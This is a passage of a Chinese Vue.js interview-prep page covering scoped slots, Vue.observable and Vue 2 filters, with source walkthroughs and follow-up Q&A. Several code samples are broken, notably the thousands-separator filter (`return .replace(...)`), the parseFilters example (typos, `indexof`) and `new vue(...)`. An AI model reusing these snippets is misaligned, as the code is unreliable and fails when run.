this.$scopedSlots[name];\\n  var nodes;\\n  // 如果存在插槽渲染函数，则执行插槽渲染函数，生成nodes节点返回\\n  // 否则使用默认值\\n  nodes = scopedSlotFn(props) || fallback;\\n  return nodes;\\n}\\n</code></pre>\\n<p><code>name</code>属性表示定义插槽的名字，默认值为<code>default</code>，<code>fallback</code>表示子组件中的<code>slot</code>节点的默认值</p>\\n<p>关于<code>this.$scopredSlots</code>是什么，我们可以先看看<code>vm.slot</code></p>\\n<pre class=\\"language-js\\"><code>function initRender (vm) {\\n  ...\\n  vm.$slots = resolveSlots(options._renderChildren, renderContext);\\n  ...\\n}\\n</code></pre>\\n<p><code>resolveSlots</code>函数会对<code>children</code>节点做归类和过滤处理，返回<code>slots</code></p>\\n<pre class=\\"language-js\\"><code>function resolveSlots (\\n    children,\\n    context\\n  ) {\\n    if (!children || !children.length) {\\n      return {}\\n    }\\n    var slots = {};\\n    for (var i = 0, l = children.length; i &lt; l; i++) {\\n      var child = children[i];\\n      var data = child.data;\\n      // remove slot attribute if the node is resolved as a Vue slot node\\n      if (data &amp;&amp; data.attrs &amp;&amp; data.attrs.slot) {\\n        delete data.attrs.slot;\\n      }\\n      // named slots should only be respected if the vnode was rendered in the\\n      // same context.\\n      if ((child.context === context || child.fnContext === context) &amp;&amp;\\n        data &amp;&amp; data.slot != null\\n      ) {\\n        // 如果slot存在(slot=&quot;header&quot;) 则拿对应的值作为key\\n        var name = data.slot;\\n        var slot = (slots[name] || (slots[name] = []));\\n        // 如果是tempalte元素 则把template的children添加进数组中，这也就是为什么你写的template标签并不会渲染成另一个标签到页面\\n        if (child.tag === &#39;template&#39;) {\\n          slot.push.apply(slot, child.children || []);\\n        } else {\\n          slot.push(child);\\n        }\\n      } else {\\n        // 如果没有就默认是default\\n        (slots.default || (slots.default = [])).push(child);\\n      }\\n    }\\n    // ignore slots that contains only whitespace\\n    for (var name$1 in slots) {\\n      if (slots[name$1].every(isWhitespace)) {\\n        delete slots[name$1];\\n      }\\n    }\\n    return slots\\n}\\n</code></pre>\\n<p><code>_render</code>渲染函数通过<code>normalizeScopedSlots</code>得到<code>vm.$scopedSlots</code></p>\\n<pre class=\\"language-js\\"><code>vm.$scopedSlots = normalizeScopedSlots(\\n  _parentVnode.data.scopedSlots,\\n  vm.$slots,\\n  vm.$scopedSlots\\n);\\n</code></pre>\\n<p>作用域插槽中父组件能够得到子组件的值是因为在<code>renderSlot</code>的时候执行会传入<code>props</code>，也就是上述<code>_t</code>第三个参数，父组件则能够得到子组件传递过来的值</p>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>父组件给按钮传入了一段 <code>&lt;span&gt;</code>，同事说插槽只是把这段 <code>DOM</code> 字符串复制进子组件，你如何用渲染链路反驳？</strong></p>\\n<p>插槽传递的不是 <code>DOM</code> 字符串，本质上会参与 <code>template -&gt; render function -&gt; VNode -&gt; DOM</code> 的渲染链路。子组件编译出的渲染函数通过 <code>_t</code> 调用插槽渲染逻辑，最终取得一组 <code>VNode</code>。若没有对应内容，才使用 <code>&lt;slot&gt;</code> 定义的 <code>fallback</code> 节点。</p>\\n</li>\\n<li>\\n<p><strong>卡片组件有 <code>header</code>、默认区和 <code>footer</code>，调用方把 <code>slot=&quot;header&quot;</code> 写在 <code>&lt;template&gt;</code> 上，为什么页面不会多出一层 <code>template</code> 标签？</strong></p>\\n<p><code>Vue</code> 会对父级传入的 <code>children</code> 按插槽名归类，<code>slot=&quot;header&quot;</code> 的内容进入对应数组，未命名内容进入 <code>default</code>。当承载者是 <code>template</code> 时，归类逻辑会把它的 <code>children</code> 直接加入插槽，而不是保留 <code>template</code> 自身为节点。只有空白内容的插槽还会被过滤，避免产生无意义结果。</p>\\n</li>\\n<li>\\n<p><strong>一个表格插槽需要拿到子组件当前行 <code>row</code>，但父组件模板里始终是 <code>undefined</code>，你会沿哪条链路检查？</strong></p>\\n<p>先检查子组件渲染插槽时是否把 <code>row</code> 放进传给 <code>_t</code> 或 <code>renderSlot</code> 的 <code>props</code>，再检查父组件是否声明并读取对应作用域变量。作用域插槽能够访问子组件值，是因为其渲染函数执行时接收了这些 <code>props</code>。只在子组件实例上存在 <code>row</code> 并不会自动暴露给父组件。</p>\\n</li>\\n<li>\\n<p><strong>线上某个具名插槽明明传了内容，却被归到默认区域；代码还通过另一个渲染上下文转发了 <code>VNode</code>，你优先怀疑什么？</strong></p>\\n<p>应优先检查传入 <code>VNode</code> 的 <code>context</code> 或 <code>fnContext</code> 是否与当前解析插槽的上下文一致，以及 <code>data.slot</code> 是否仍保留正确名称。具名插槽只有在上下文匹配时才按名称归类，否则会落入 <code>default</code>。若节点经过转发或手写渲染函数，这类上下文和数据字段更容易被破坏。</p>\\n</li>\\n<li>\\n<p><strong>设计系统准备把十几个“是否显示、显示什么内容”的 <code>props</code> 改为插槽，但担心默认 <code>UI</code> 全部丢失，你会怎么设计边界？</strong></p>\\n<p>把调用方需要替换的结构暴露为具名插槽，同时在子组件的 <code>&lt;slot&gt;</code> 内保留 <code>fallback</code>，就能兼顾定制与默认展示。渲染时存在相应插槽函数便执行并生成节点，否则返回默认节点。插槽适合交付结构和 <code>VNode</code>；稳定的数据约束仍应使用 <code>props</code>，避免把组件契约全部变成任意模板。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_48-vue-observable你有了解过吗-说说看\\"><a class=\\"header-anchor\\" href=\\"#_48-vue-observable你有了解过吗-说说看\\">#</a> 48 Vue.observable你有了解过吗？说说看</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>Vue.observable(obj)</code> 把一个普通对象变成响应式对象，返回值可以直接用在渲染函数和 <code>computed</code> 里</li>\\n<li>典型用途：<strong>小型项目的极简状态管理</strong> —— 不引 <code>Vuex</code>，用它造一个跨组件共享的响应式 store</li>\\n<li>本质就是把 <code>Vue</code> 内部的 <code>observe</code> 方法暴露出来，和 <code>data</code> 走的是同一套响应式逻辑</li>\\n<li>⚠️ 它没有 <code>Vuex</code> 的变更追踪、时间旅行、模块化，状态被谁改了无从查起 —— 规模一大就会失控</li>\\n<li><code>Vue 3</code> 里对应的是 <code>reactive()</code>，而且组合式 API 让&quot;模块级响应式状态&quot;成了官方推荐的轻量方案</li>\\n</ul>\\n<p>**<code>Vue.observable()</code> 可以把普通对象变成响应式数据，适合作为轻量的跨组件状态存储。**它内部复用了 <code>Vue</code> 处理 <code>data</code> 的响应式逻辑，通过 <code>Observer</code>、<code>defineReactive</code> 和依赖通知，让读取它的计算属性或视图在数据变化后更新。项目功能不复杂，又觉得事件总线或 <code>Vuex</code> 偏重时，可以把状态和修改方法放在独立模块中统一导出。需要注意，<code>Vue</code> 2 会直接改造原对象，而 <code>Vue</code> 3 返回响应式代理，直接修改源对象不会触发响应。</p>\\n</section>\\n<h3 id=\\"observable-是什么\\"><a class=\\"header-anchor\\" href=\\"#observable-是什么\\">#</a> Observable 是什么</h3>\\n<p><code>Observable</code> 翻译过来我们可以理解成<strong>可观察的</strong></p>\\n<p>我们先来看一下其在<code>Vue</code>中的定义</p>\\n<blockquote>\\n<p><code>Vue.observable</code>，让一个对象变成响应式数据。<code>Vue</code> 内部会用它来处理 <code>data</code> 函数返回的对象</p>\\n</blockquote>\\n<p>返回的对象可以直接用于渲染函数和计算属性内，并且会在发生变更时触发相应的更新。也可以作为最小化的跨组件状态存储器</p>\\n<pre class=\\"language-js\\"><code>Vue.observable({ count : 1})\\n</code></pre>\\n<p>其作用等同于</p>\\n<pre class=\\"language-js\\"><code>new vue({ count : 1})\\n</code></pre>\\n<p>在 <code>Vue 2.x</code> 中，被传入的对象会直接被 <code>Vue.observable</code> 变更，它和被返回的对象是同一个对象</p>\\n<p>在 <code>Vue 3.x</code> 中，则会返回一个可响应的代理，而对源对象直接进行变更仍然是不可响应的</p>\\n<h3 id=\\"使用场景\\"><a class=\\"header-anchor\\" href=\\"#使用场景\\">#</a> 使用场景</h3>\\n<p>在非父子组件通信时，可以使用通常的<code>bus</code>或者使用<code>vuex</code>，但是实现的功能不是太复杂，而使用上面两个又有点繁琐。这时，<code>observable</code>就是一个很好的选择</p>\\n<p>创建一个<code>js</code>文件</p>\\n<pre class=\\"language-js\\"><code>// 引入vue\\nimport Vue from &#39;vue\\n// 创建state对象，使用observable让state对象可响应\\nexport let state = Vue.observable({\\n  name: &#39;张三&#39;,\\n  &#39;age&#39;: 38\\n})\\n// 创建对应的方法\\nexport let mutations = {\\n  changeName(name) {\\n    state.name = name\\n  },\\n  setAge(age) {\\n    state.age = age\\n  }\\n}\\n</code></pre>\\n<p>在<code>.vue</code>文件中直接使用即可</p>\\n<pre class=\\"language-js\\"><code>&lt;template&gt;\\n  &lt;div&gt;\\n    姓名：{{ name }}\\n    年龄：{{ age }}\\n    &lt;button @click=&quot;changeName(&#39;李四&#39;)&quot;&gt;改变姓名&lt;/button&gt;\\n    &lt;button @click=&quot;setAge(18)&quot;&gt;改变年龄&lt;/button&gt;\\n  &lt;/div&gt;\\n&lt;/template&gt;\\nimport { state, mutations } from &#39;@/store\\nexport default {\\n  // 在计算属性中拿到值\\n  computed: {\\n    name() {\\n      return state.name\\n    },\\n    age() {\\n      return state.age\\n    }\\n  },\\n  // 调用mutations里面的方法，更新数据\\n  methods: {\\n    changeName: mutations.changeName,\\n    setAge: mutations.setAge\\n  }\\n}\\n</code></pre>\\n<h3 id=\\"原理分析\\"><a class=\\"header-anchor\\" href=\\"#原理分析\\">#</a> 原理分析</h3>\\n<p>源码位置：<code>src\\\\core\\\\observer\\\\index.js</code></p>\\n<pre class=\\"language-js\\"><code>export function observe (value: any, asRootData: ?boolean): Observer | void {\\n  if (!isObject(value) || value instanceof VNode) {\\n    return\\n  }\\n  let ob: Observer | void\\n  // 判断是否存在__ob__响应式属性\\n  if (hasOwn(value, &#39;__ob__&#39;) &amp;&amp; value.__ob__ instanceof Observer) {\\n    ob = value.__ob__\\n  } else if (\\n    shouldObserve &amp;&amp;\\n    !isServerRendering() &amp;&amp;\\n    (Array.isArray(value) || isPlainObject(value)) &amp;&amp;\\n    Object.isExtensible(value) &amp;&amp;\\n    !value._isVue\\n  ) {\\n    // 实例化Observer响应式对象\\n    ob = new Observer(value)\\n  }\\n  if (asRootData &amp;&amp; ob) {\\n    ob.vmCount++\\n  }\\n  return ob\\n}\\n</code></pre>\\n<p><code>Observer</code>类</p>\\n<pre class=\\"language-js\\"><code>export class Observer {\\n    value: any;\\n    dep: Dep;\\n    vmCount: number; // number of vms that have this object as root $data\\n\\n    constructor (value: any) {\\n        this.value = value\\n        this.dep = new Dep()\\n        this.vmCount = 0\\n        def(value, &#39;__ob__&#39;, this)\\n        if (Array.isArray(value)) {\\n            if (hasProto) {\\n                protoAugment(value, arrayMethods)\\n            } else {\\n                copyAugment(value, arrayMethods, arrayKeys)\\n            }\\n            this.observeArray(value)\\n        } else {\\n            // 实例化对象是一个对象，进入walk方法\\n            this.walk(value)\\n        }\\n}\\n</code></pre>\\n<p><code>walk</code>函数</p>\\n<pre class=\\"language-js\\"><code>walk (obj: Object) {\\n    const keys = Object.keys(obj)\\n    // 遍历key，通过defineReactive创建响应式对象\\n    for (let i = 0; i &lt; keys.length; i++) {\\n        defineReactive(obj, keys[i])\\n    }\\n}\\n</code></pre>\\n<p><code>defineReactive</code>方法</p>\\n<pre class=\\"language-js\\"><code>export function defineReactive (\\n  obj: Object,\\n  key: string,\\n  val: any,\\n  customSetter?: ?Function,\\n  shallow?: boolean\\n) {\\n  const dep = new Dep()\\n\\n  const property = Object.getOwnPropertyDescriptor(obj, key)\\n  if (property &amp;&amp; property.configurable === false) {\\n    return\\n  }\\n\\n  // cater for pre-defined getter/setters\\n  const getter = property &amp;&amp; property.get\\n  const setter = property &amp;&amp; property.set\\n  if ((!getter || setter) &amp;&amp; arguments.length === 2) {\\n    val = obj[key]\\n  }\\n\\n  let childOb = !shallow &amp;&amp; observe(val)\\n  // 接下来调用Object.defineProperty()给对象定义响应式属性\\n  Object.defineProperty(obj, key, {\\n    enumerable: true,\\n    configurable: true,\\n    get: function reactiveGetter () {\\n      const value = getter ? getter.call(obj) : val\\n      if (Dep.target) {\\n        dep.depend()\\n        if (childOb) {\\n          childOb.dep.depend()\\n          if (Array.isArray(value)) {\\n            dependArray(value)\\n          }\\n        }\\n      }\\n      return value\\n    },\\n    set: function reactiveSetter (newVal) {\\n      const value = getter ? getter.call(obj) : val\\n      /* eslint-disable no-self-compare */\\n      if (newVal === value || (newVal !== newVal &amp;&amp; value !== value)) {\\n        return\\n      }\\n      /* eslint-enable no-self-compare */\\n      if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; customSetter) {\\n        customSetter()\\n      }\\n      // #7981: for accessor properties without setter\\n      if (getter &amp;&amp; !setter) return\\n      if (setter) {\\n        setter.call(obj, newVal)\\n      } else {\\n        val = newVal\\n      }\\n      childOb = !shallow &amp;&amp; observe(newVal)\\n      // 对观察者watchers进行通知,state就成了全局响应式对象\\n      dep.notify()\\n    }\\n  })\\n}\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>商品编辑页把一个 <code>VNode</code> 和冻结后的商品配置传给 <code>observe()</code>，同事认为任何对象都会被转成响应式对象，这两个值真的会被观测吗？</strong></p>\\n<p>不会一概观测：<code>VNode</code> 会直接返回，冻结对象因不可扩展也无法创建 <code>Observer</code>。此外还要满足非服务端渲染、<code>shouldObserve</code> 开启、值为数组或普通对象且不是 <code>Vue</code> 实例等条件，所以“传入对象就必然响应式”是错误判断。</p>\\n</li>\\n<li>\\n<p><strong>用户中心把同一份资料对象先后交给多个组件处理，如何避免重复执行 <code>walk()</code> 和重复安装 <code>getter/setter</code>？</strong></p>\\n<p>首次观测时会在对象上定义不可枚举的 <code>__ob__</code>，其值指向对应的 <code>Observer</code>。后续 <code>observe()</code> 发现已有合法的 <code>__ob__</code> 就直接复用，因此不会再次遍历属性；若对象不允许扩展，则连首次观测也无法建立。</p>\\n</li>\\n<li>\\n<p><strong>订单页初始化时有一万个普通字段，后来又动态增加 <code>extraFee</code>，为什么原字段能触发更新而新字段直接赋值可能不行？</strong></p>\\n<p><code>Observer.walk()</code> 只遍历观测当时 <code>Object.keys()</code> 得到的字段，并用 <code>defineReactive()</code> 为它们安装访问器。后加的 <code>extraFee</code> 没经过这一步，就没有独立的 <code>Dep</code> 和通知逻辑；需要使用框架提供的新增响应式属性入口，或预先声明字段。</p>\\n</li>\\n<li>\\n<p><strong>报表页读取 <code>state.rows</code> 后依赖已收集，但替换整段数组时视图没有更新，你会沿源码检查哪条链路？</strong></p>\\n<p>先确认外层 <code>rows</code> 属性是否确实经过 <code>defineReactive()</code>，读取时是否存在当前 <code>Dep.target</code>，再检查赋值是否命中了同值短路或只读 <code>getter</code>。正常替换会重新 <code>observe(newVal)</code> 并执行 <code>dep.notify()</code>；任一环节未建立，通知链都会中断。</p>\\n</li>\\n<li>\\n<p><strong>购物车里既有嵌套对象又有数组，为什么 <code>getter</code> 除了执行属性自己的 <code>dep.depend()</code>，还要依赖 <code>childOb.dep</code> 并对数组调用 <code>dependArray()</code>？</strong></p>\\n<p>属性的 <code>Dep</code> 负责跟踪该字段本身的读取和替换，子对象的 <code>Observer.dep</code> 则补充对子结构变动的依赖。数组元素无法像普通字段那样逐个拦截索引访问，因此还要递归收集数组成员依赖；代价是深层、巨大结构的观测和收集成本更高。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_49-vue中的过滤器了解吗-过滤器的应用场景有哪些\\"><a class=\\"header-anchor\\" href=\\"#_49-vue中的过滤器了解吗-过滤器的应用场景有哪些\\">#</a> 49 Vue中的过滤器了解吗？过滤器的应用场景有哪些？</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>过滤器用管道符调用：<code>{&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;{ price | toFixed2 }&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;}</code>，只能用在插值和 <code>v-bind</code> 里</li>\\n<li>场景：金额格式化、时间格式化、文本截断、状态码转文案 —— 都是<strong>纯展示层的值转换</strong></li>\\n<li>可以串联（<code>{&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;{ a | f | g }&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;}</code>）、可以传参（<code>{&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;{ a | f(1) }&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;}</code>），第一个参数永远是管道左边的值</li>\\n<li>⚠️ <strong><code>Vue 3</code> 已彻底移除过滤器</strong>，官方建议改用 <code>computed</code> 或普通方法</li>\\n<li>移除理由：管道语法是额外的语言概念、无法被 <code>TS</code> 类型推导、<code>computed</code>/方法能做同样的事且更通用</li>\\n</ul>\\n<p>**<code>Vue</code> 过滤器用于展示层的数据转换，它返回加工后的结果，但不会修改原始数据。**在 <code>Vue</code> 2 中，它只能写在双花括号插值或 <code>v-bind</code> 表达式末尾，通过管道符调用，也支持串联和额外传参，管道左侧的值始终是第一个参数。常见场景是金额千分位、单位转换、文本和时间格式化，这些处理都只影响最终展示。局部过滤器与全局过滤器重名时优先使用局部定义；<code>Vue</code> 3 已废弃 <code>filter</code>，迁移时可改用普通方法或计算属性。</p>\\n</section>\\n<p>过滤器实质不改变原始数据，只是对数据进行加工处理后返回过滤后的数据再进行调用处理，我们也可以理解其为一个纯函数</p>\\n<p>Vue 允许你自定义过滤器，可被用于一些常见的文本格式化</p>\\n<p>ps: <code>Vue3</code>中已废弃<code>filter</code></p>\\n<h3 id=\\"如何用\\"><a class=\\"header-anchor\\" href=\\"#如何用\\">#</a> 如何用</h3>\\n<p>vue中的过滤器可以用在两个地方：双花括号插值和 <code>v-bind</code> 表达式，过滤器应该被添加在 JavaScript表达式的尾部，由“管道”符号指示：</p>\\n<pre class=\\"language-html\\"><code>&lt;!-- 在双花括号中 --&gt;\\n{ message | capitalize }\\n\\n&lt;!-- 在 `v-bind` 中 --&gt;\\n&lt;div v-bind:id=&quot;rawId | formatId&quot;&gt;&lt;/div&gt;\\n</code></pre>\\n<h3 id=\\"定义filter\\"><a class=\\"header-anchor\\" href=\\"#定义filter\\">#</a> 定义filter</h3>\\n<p>在组件的选项中定义本地的过滤器</p>\\n<pre class=\\"language-js\\"><code>filters: {\\n  capitalize: function (value) {\\n    if (!value) return &#39;&#39;\\n    value = value.toString()\\n    return value.charAt(0).toUpperCase() + value.slice(1)\\n  }\\n}\\n</code></pre>\\n<p>定义全局过滤器：</p>\\n<pre class=\\"language-js\\"><code>Vue.filter(&#39;capitalize&#39;, function (value) {\\n  if (!value) return &#39;&#39;\\n  value = value.toString()\\n  return value.charAt(0).toUpperCase() + value.slice(1)\\n})\\n\\nnew Vue({\\n  // ...\\n})\\n</code></pre>\\n<p>注意：当全局过滤器和局部过滤器重名时，会采用局部过滤器</p>\\n<p>过滤器函数总接收表达式的值 (之前的操作链的结果) 作为第一个参数。在上述例子中，<code>capitalize</code> 过滤器函数将会收到 <code>message</code> 的值作为第一个参数</p>\\n<p>过滤器可以串联：</p>\\n<pre class=\\"language-text\\"><code>{ message | filterA | filterB }\\n</code></pre>\\n<p>在这个例子中，<code>filterA</code> 被定义为接收单个参数的过滤器函数，表达式 <code>message</code> 的值将作为参数传入到函数中。然后继续调用同样被定义为接收单个参数的过滤器函数 <code>filterB</code>，将 <code>filterA</code> 的结果传递到 <code>filterB</code> 中。</p>\\n<p>过滤器是 <code>JavaScript</code>函数，因此可以接收参数：</p>\\n<pre class=\\"language-text\\"><code>{{ message | filterA(&#39;arg1&#39;, arg2) }}\\n</code></pre>\\n<p>这里，<code>filterA</code> 被定义为接收三个参数的过滤器函数。</p>\\n<p>其中 <code>message</code> 的值作为第一个参数，普通字符串 <code>\'arg1\'</code> 作为第二个参数，表达式 <code>arg2</code> 的值作为第三个参数</p>\\n<p>举个例子：</p>\\n<pre class=\\"language-html\\"><code>&lt;div id=&quot;app&quot;&gt;\\n  &lt;p&gt;{{ msg | msgFormat(&#39;疯狂&#39;,&#39;--&#39;)}}&lt;/p&gt;\\n&lt;/div&gt;\\n\\n&lt;script&gt;\\n    // 定义一个 Vue 全局的过滤器，名字叫做  msgFormat\\n    Vue.filter(&#39;msgFormat&#39;, function(msg, arg, arg2) {\\n        // 字符串的  replace 方法，第一个参数，除了可写一个 字符串之外，还可以定义一个正则\\n        return msg.replace(/单纯/g, arg+arg2)\\n    })\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>小结：</strong></p>\\n<ul>\\n<li>部过滤器优先于全局过滤器被调用</li>\\n<li>一个表达式可以使用多个过滤器。过滤器之间需要用管道符“|”隔开。其执行顺序从左往右</li>\\n</ul>\\n<h3 id=\\"应用场景-2\\"><a class=\\"header-anchor\\" href=\\"#应用场景-2\\">#</a> 应用场景</h3>\\n<p>平时开发中，需要用到过滤器的地方有很多，比如<code>单位转换</code>、<code>数字打点</code>、<code>文本格式化</code>、<code>时间格式化</code>之类的等</p>\\n<p>比如我们要实现将<code>30000 =&gt; 30,000</code>，这时候我们就需要使用过滤器</p>\\n<pre class=\\"language-js\\"><code>Vue.filter(&#39;toThousandFilter&#39;, function (value) {\\n  if (!value) return &#39;&#39;\\n  value = value.toString()\\n  return .replace(str.indexOf(&#39;.&#39;) &gt; -1 ? /(\\\\d)(?=(\\\\d{3})+\\\\.)/g : /(\\\\d)(?=(?:\\\\d{3})+$)/g, &#39;$1,&#39;)\\n})\\n</code></pre>\\n<h3 id=\\"原理分析-2\\"><a class=\\"header-anchor\\" href=\\"#原理分析-2\\">#</a> 原理分析</h3>\\n<p>使用过滤器</p>\\n<pre class=\\"language-js\\"><code>{{ message | capitalize }}\\n</code></pre>\\n<p>在模板编译阶段过滤器表达式将会被编译为过滤器函数，主要是用过<code>parseFilters</code>，我们放到最后讲</p>\\n<pre class=\\"language-js\\"><code>_s(_f(&#39;filterFormat&#39;)(message))\\n</code></pre>\\n<p>首先分析一下<code>_f</code>：</p>\\n<p><code>_f</code> 函数全名是：<code>resolveFilter</code>，这个函数的作用是从<code>this.$options.filters</code>中找出注册的过滤器并返回</p>\\n<pre class=\\"language-js\\"><code>// 变为\\nthis.$options.filters[&#39;filterFormat&#39;](message) // message为参数\\n</code></pre>\\n<p>关于<code>resolveFilter</code></p>\\n<pre class=\\"language-js\\"><code>import { indentity,resolveAsset } from &#39;core/util/index&#39; \\n\\nexport function resolveFilter(id){\\n  return resolveAsset(this.$options,&#39;filters&#39;,id,true) || identity\\n}\\n</code></pre>\\n<p>内部直接调用<code>resolveAsset</code>，将<code>option</code>对象，类型，过滤器<code>id</code>，以及一个触发警告的标志作为参数传递，如果找到，则返回过滤器；</p>\\n<p><code>resolveAsset</code>的代码如下：</p>\\n<pre class=\\"language-js\\"><code>export function resolveAsset(options,type,id,warnMissing){ // 因为我们找的是过滤器，所以在 resolveFilter函数中调用时 type 的值直接给的 &#39;filters&#39;,实际这个函数还可以拿到其他很多东西\\n  if(typeof id !== &#39;string&#39;){ // 判断传递的过滤器id 是不是字符串，不是则直接返回\\n      return \\n  }\\n  const assets = options[type]  // 将我们注册的所有过滤器保存在变量中\\n  // 接下来的逻辑便是判断id是否在assets中存在，即进行匹配\\n  if(hasOwn(assets,id)) return assets[id] // 如找到，直接返回过滤器\\n  // 没有找到，代码继续执行\\n  const camelizedId  = camelize(id) // 万一你是驼峰的呢\\n  if(hasOwn(assets,camelizedId)) return assets[camelizedId]\\n  // 没找到，继续执行\\n  const PascalCaseId = capitalize(camelizedId) // 万一你是首字母大写的驼峰呢\\n  if(hasOwn(assets,PascalCaseId)) return assets[PascalCaseId]\\n  // 如果还是没找到，则检查原型链(即访问属性)\\n  const result = assets[id] || assets[camelizedId] || assets[PascalCaseId]\\n  // 如果依然没找到，则在非生产环境的控制台打印警告\\n  if(process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; warnMissing &amp;&amp; !result){\\n    warn(&#39;Failed to resolve &#39; + type.slice(0,-1) + &#39;: &#39; + id, options)\\n  }\\n  // 无论是否找到，都返回查找结果\\n  return result\\n}\\n</code></pre>\\n<p>下面再来分析一下<code>_s</code>：</p>\\n<p><code>_s</code> 函数的全称是 <code>toString</code>,过滤器处理后的结果会当作参数传递给 <code>toString</code>函数，最终 <code>toString</code>函数执行后的结果会保存到<code>Vnode</code>中的text属性中，渲染到视图中</p>\\n<pre class=\\"language-js\\"><code>function toString(value){\\n  return value == null\\n  ? &#39;&#39;\\n  : typeof value === &#39;object&#39;\\n    ? JSON.stringify(value,null,2)// JSON.stringify()第三个参数可用来控制字符串里面的间距\\n    : String(value)\\n}\\n</code></pre>\\n<p>最后，在分析下<code>parseFilters</code>，在模板编译阶段使用该函数阶段将模板过滤器解析为过滤器函数调用表达式</p>\\n<pre class=\\"language-js\\"><code>function parseFilters (filter) {\\n    let filters = filter.split(&#39;|&#39;)\\n    let expression = filters.shift().trim() // shift()删除数组第一个元素并将其返回，该方法会更改原数组\\n    let i\\n    if (filters) {\\n        for(i = 0;i &lt; filters.length;i++){\\n            experssion = warpFilter(expression,filters[i].trim()) // 这里传进去的expression实际上是管道符号前面的字符串，即过滤器的第一个参数\\n        }\\n    }\\n    return expression\\n}\\n// warpFilter函数实现\\nfunction warpFilter(exp,filter){\\n    // 首先判断过滤器是否有其他参数\\n    const i = filter.indexof(&#39;(&#39;)\\n    if(i&lt;0){ // 不含其他参数，直接进行过滤器表达式字符串的拼接\\n        return `_f(&quot;${filter}&quot;)(${exp})`\\n    }else{\\n        const name = filter.slice(0,i) // 过滤器名称\\n        const args = filter.slice(i+1) // 参数，但还多了 ‘)’\\n        return `_f(&#39;${name}&#39;)(${exp},${args}` // 注意这一步少给了一个 &#39;)&#39;\\n    }\\n}\\n</code></pre>\\n<p><strong>小结：</strong></p>\\n<ul>\\n<li>在编译阶段通过<code>parseFilters</code>将过滤器编译成函数调用（串联过滤器则是一个嵌套的函数调用，前一个过滤器执行的结果是后一个过滤器函数的参数）</li>\\n<li>编译后通过调用<code>resolveFilter</code>函数找到对应过滤器并返回结果</li>\\n<li>执行结果作为参数传递给<code>toString</code>函数，而<code>toString</code>执行后，其结果会保存在<code>Vnode</code>的<code>text</code>属性中，渲染到视图</li>\\n</ul>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>订单列表模板写了 <code>{&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;{ price | currency }&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;}</code>，同事说运行时会把管道表达式原样解释执行；你会怎样用编译结果反驳？</strong></p>\\n<p>管道语法会在模板编译阶段被 <code>parseFilters</code> 改写，而不是在渲染时重新解释字符串。该表达式会形成类似 <code>_s(_f(\'currency\')(price))</code> 的调用：先解析过滤器并执行，再由 <code>_s</code> 转成最终文本。</p>\\n</li>\\n<li>\\n<p><strong>后台同时注册了 <code>order-status</code>、<code>orderStatus</code> 风格的过滤器，页面写法又不统一，<code>resolveAsset</code> 会按什么顺序查找？</strong></p>\\n<p>解析时先按原始 <code>id</code> 查找，再尝试驼峰形式和首字母大写的驼峰形式，最后还会通过普通属性访问检查原型链。若仍未找到，开发环境会发出警告；依赖名称兼容会掩盖命名混乱，工程上仍应统一注册与使用规范。</p>\\n</li>\\n<li>\\n<p><strong>账单页写 <code>{&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;{ amount | currency(\'CNY\') | mask }&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;}</code>，评审担心后一个过滤器拿不到前一个结果，编译后调用关系是什么？</strong></p>\\n<p>多个过滤器会被逐层包装成嵌套函数调用，前一个过滤器的返回值自然成为后一个过滤器的首个参数。带参数的过滤器会把原表达式放在首位，再拼接显式参数；这种改写依赖编译器正确识别表达式边界，不能简单按所有 <code>|</code> 字符切分业务代码。</p>\\n</li>\\n<li>\\n<p><strong>消息详情页的过滤器偶尔返回 <code>null</code>、对象或数字，最终写入文本 <code>VNode</code> 时分别会得到什么？</strong></p>\\n<p>过滤结果会交给 <code>_s</code>，也就是 <code>toString()</code>：<code>null</code> 或 <code>undefined</code> 变为空字符串，对象使用带缩进的 <code>JSON.stringify()</code>，其他值使用 <code>String()</code>。因此过滤器返回复杂对象虽能显示，但通常不是稳定的展示契约，还可能暴露不应直接呈现的数据结构。</p>\\n</li>\\n<li>\\n<p><strong>线上页面把 <code>currncy</code> 拼错后只看到原值，没有立即崩溃，你会检查 <code>_f</code> 的哪段兜底逻辑？</strong></p>\\n<p><code>_f</code> 会通过 <code>resolveAsset()</code> 查找过滤器，未找到时返回 <code>identity</code>，所以输入可能被原样输出。开发环境通常还能看到缺失过滤器的警告，但生产环境不能依赖该提示；应在构建检查或测试中覆盖模板名称，避免静默降级进入线上。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_50-vue项目中有封装过axios吗-主要是封装哪方面的\\"><a class=\\"header-anchor\\" href=\\"#_50-vue项目中有封装过axios吗-主要是封装哪方面的\\">#</a> 50 